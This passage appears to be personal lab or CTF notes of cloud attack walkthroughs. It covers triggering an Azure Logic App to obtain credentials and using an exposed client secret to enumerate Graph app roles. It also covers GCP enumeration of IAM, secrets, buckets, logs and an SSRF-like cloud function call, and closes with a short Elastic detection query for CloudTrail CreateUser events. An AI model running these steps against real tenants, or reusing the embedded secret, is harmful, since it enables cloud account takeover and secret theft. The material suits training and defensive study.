    --subscription 662a4fee-a3ba-49b3-9caf-8c20ed04503f \
    --output json
```
3. Enumerating Logic App Workflow
```sh
#тут мы получаем url
az logic workflow list \
    --resource-group LogicAPP-Rg \
    --subscription 662a4fee-a3ba-49b3-9caf-8c20ed04503f \
    --output json
```
4. Triggering the Azure Logic APP
```sh
#тут мы получаем креды
curl -X POST \
'https://prod-42.eastus.logic.azure.com:443/workflows/c6f0176db15c466498c89e910ba8b4fe/triggers/When_a_HTTP_request_is_received/paths/invoke?api-version=2016-06-01&sp=%2Ftriggers%2FWhen_a_HTTP_request_is_received%2Frun&sv=1.0&sig=Zl-wTFfaCL1I_BwHVUqYzQbywNUoaSZg88NcfiDX3IQ' \
-H 'Content-Type: application/json' \
-d '{}'
```
5. Authenticating with new service principal
```sh
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "client_id=4f77df99-134e-4602-97b7-a3c0e73f9667" -d "scope=https://graph.microsoft.com/.default" -d "client_secret=UYY8Q~oCHFS2GjQReHcZ3G8lm_X4OLWMF4dgna_q" -d "grant_type=client_credentials" "https://login.microsoftonline.com/f2a33211-e46a-4c92-b84d-aff06c2cd13f/oauth2/v2.0/token"
```
6. Connect to Microsoft Graph API
```sh
GRAPH_TOKEN="eyJ0eXAiOiJKV1QiLCJ..."
```
7. Enumerate App Registrations
```sh
az rest --method GET \
    --url "https://graph.microsoft.com/v1.0/applications" \
    --headers "Authorization=Bearer $GRAPH_TOKEN" \
    --output json
    

az rest --method GET \
    --url "https://graph.microsoft.com/v1.0/applications" \
    --headers "Authorization=Bearer $GRAPH_TOKEN" \
    --query "value[].{Name:displayName, AppId:id, Created:createdDateTime}" \
    --output table
```
8. Investigate API Permissions
```sh
az rest --method GET \
    --url "https://graph.microsoft.com/v1.0/applications/4652ca30-6752-40bc-abbc-730878eb7fdf" \
    --headers "Authorization=Bearer $GRAPH_TOKEN" \
    --output json
```
9. Find the Exact API Role
```sh
az rest --method GET \
    --url "https://graph.microsoft.com/v1.0/applications/4652ca30-6752-40bc-abbc-730878eb7fdf" \
    --headers "Authorization=Bearer $GRAPH_TOKEN" \
    --query "requiredResourceAccess" \
    --output json

MSGRAPH_SP=$(az rest --method GET \
    --url "https://graph.microsoft.com/v1.0/servicePrincipals?$filter=displayName eq 'Microsoft Graph'" \
    --headers "Authorization=Bearer $GRAPH_TOKEN" \
    --query "value[0].id" -o tsv)

az rest --method GET \
    --url "https://graph.microsoft.com/v1.0/servicePrincipals/$MSGRAPH_SP" \
    --headers "Authorization=Bearer $GRAPH_TOKEN" \
    --query "appRoles" \
    --output json

GRAPH_ROLE_ID="9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30"
MSGRAPH_SP_ID=$(az rest --method GET \
    --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=displayName eq 'Microsoft Graph'" \
    --headers "Authorization=Bearer $GRAPH_TOKEN" \
    --query "value[0].id" -o tsv)

az rest --method GET \
    --url "https://graph.microsoft.com/v1.0/servicePrincipals/$MSGRAPH_SP_ID" \
    --headers "Authorization=Bearer $GRAPH_TOKEN" \
    | jq --arg ROLE_ID "$GRAPH_ROLE_ID" '.appRoles[] | select(.id==$ROLE_ID)'
```
---
## FunctionProxy - Secret Leak
1. Authenticate to GCP
```sh
gcloud auth activate-service-account --key-file creds.json
```
2. Check IAM Permissions of Your Service Account
```sh
gcloud projects get-iam-policy woven-acolyte-428406-v9 --flatten="bindings[].members" --filter="bindings.members:serviceAccount:service-mgmt-sa@woven-acolyte-428406-v9.iam.gserviceaccount.com" --format="table(bindings.role)"
```
“projects get-iam-policy” this command will help us to get all the permission assigned to the service account at project level.
Now inspect any custom roles (if present):
```sh
gcloud iam roles describe service_mgmt_sa --project woven-acolyte-428406-v9
```
Now list all the identities (Service Account):
```sh
gcloud iam service-accounts list --project woven-acolyte-428406-v9
```
3. Know the Secret Manager
```sh
gcloud secrets list --project woven-acolyte-428406-v9
```
Then, try to see the value of the secret stored in **secops-internal-service-key**:
```sh
gcloud secrets versions access latest --secret=<Secret_Name> --project woven-acolyte-428406-v9
```
Since we can’t directly view the secret values, let’s investigate who has access permissions on the Secret Manager.
```sh
gcloud secrets get-iam-policy <Secret_Name> --project woven-acolyte-428406-v9
```
4. Enumerate Storage Buckets (Passive Discovery)
Initially, let’s try to list all the Buckets
```sh
gcloud storage buckets list --project woven-acolyte-428406-v9
```
We’ve now identified a **list of buckets**. Next, we’ll attempt to list the objects within each bucket and check if any of them can be downloaded. This process will be repeated for all the discovered buckets.
To List the objects of the Bucket:
```sh
gcloud storage ls gs://<Bucket_Name>/
```
To download the objects of the Bucket:
```sh
gcloud storage cp gs://<Bucket_Name>/Object_Name/ .
```
5. Cloud Function Recon
```sh
gcloud functions list --regions us-central1 --project woven-acolyte-428406-v9
```
For secops-internal-service-fn:
```sh
gcloud functions describe secops-internal-service-fn --region us-central1 --project woven-acolyte-428406-v9
```
Now lets try to get who has what permission on the secops-internal-service-fn function
```sh
gcloud functions get-iam-policy secops-internal-service-fn --region us-central1 --project woven-acolyte-428406-v9
```
6. Exploit External Trigger Function
```sh
curl -X POST "https://us-central1-woven-acolyte-428406-v9.cloudfunctions.net/secops-internal-service-trigger-fn" -H "Content-Type: application/json"  -d '{"url":"https://us-central1-woven-acolyte-428406-v9.cloudfunctions.net/secops-internal-service-fn"}'
```

## Secrets Hidden in Plain Sight 
1. auth
```sh
gcloud auth activate-service-account --key-file <Keyfile>
```
2. Check IAM Permissions of Your Service Account
```sh
gcloud projects get-iam-policy woven-acolyte-428406-v9 --flatten="bindings[].members" --filter="bindings.members:log-reviewer-sa@woven-acolyte-428406-v9.iam.gserviceaccount.com" --format="table(bindings.role)"
```
inspect any custom roles
```sh
gcloud iam roles describe log_reviewer_sa_viewer_role --project=woven-acolyte-428406-v9
```
3. Explore Logging Infrastructure
```sh
gcloud logging buckets list --project=woven-acolyte-428406-v9
```
view the log views configured in the bucket
```sh
gcloud logging views list --bucket=secops-log-storage-buck  --location=global --project woven-acolyte-428406-v9
```
4. Inspect Logs for Secrets
```sh
gcloud logging read "" --bucket=secops-log-storage-buck --location=global --limit=50 --format="table(timestamp, logName, textPayload)" --view=_AllLogs --freshness=50d --project=woven-acolyte-428406-v9 
```






# Defensive
## User Account Creation Alchemy
Analytics → Discover
Executing the query below helps filter events that are specifically related to platform log activity.

```
event.dataset: aws.cloudtrail
```
filter events related to the "CreateUser" action
```
event.dataset: aws.cloudtrail and aws.cloudtrail.user_identity.type: IAMUser and event.action: "CreateUser" 
```
